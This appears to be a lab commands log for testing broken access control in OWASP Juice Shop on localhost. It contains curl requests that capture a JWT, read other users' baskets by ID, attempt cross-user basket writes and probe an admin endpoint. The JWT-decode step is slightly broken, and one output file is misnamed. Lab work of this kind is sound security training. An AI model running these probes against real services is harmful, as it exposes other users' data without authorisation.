# Commands Log — OWASP A01: Broken Access Control (Juice Shop)

## Recon
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000

## Setup
mkdir -p raw-output screenshots
touch README.md commands.md findings.md methodology.md remediation.md

## Register attacker account
curl -s -X POST http://localhost:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!","passwordRepeat":"Passw0rd!"}' \
  -o raw-output/register_attacker.json

## Login and capture JWT
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}' \
  -o raw-output/login_result.json

export TOKEN=$(cat raw-output/login_result.json | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

## Decode JWT payload to confirm role
python3 -c "
import base64, json
payload = '\$TOKEN'.split('.')[1]
payload += '=' * (-len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
"

## Finding 1: Basket read IDOR
# Baseline: attacker's own basket (id=7)
curl -s http://localhost:3000/rest/basket/7 \
  -H "Authorization: Bearer $TOKEN" \
  -o raw-output/basket_own_7.json

# Unauthorized reads of other users' baskets
curl -s http://localhost:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN" \
  -o raw-output/basket_own.json

curl -s http://localhost:3000/rest/basket/2 \
  -H "Authorization: Bearer $TOKEN" \
  -o raw-output/basket_idor_2.json

## Finding 2: Write-path control test (negative result)
# Attempt write into another user's basket (should fail)
curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"BasketId":2,"quantity":5}' \
  -o raw-output/basket_idor_2_write_attempt.json

# Confirm write succeeds on own basket (baseline control)
curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"BasketId":7,"quantity":1}' \
  -o raw-output/basket_own_write_success.json

## Supporting recon
curl -s http://localhost:3000/api/Products/1 -o raw-output/product_1.json
curl -s http://localhost:3000/rest/order-history -H "Authorization: Bearer $TOKEN" -o raw-output/order_history_own.json
curl -s http://localhost:3000/rest/admin/application-configuration -H "Authorization: Bearer $TOKEN" -o raw-output/admin_config_attempt.json
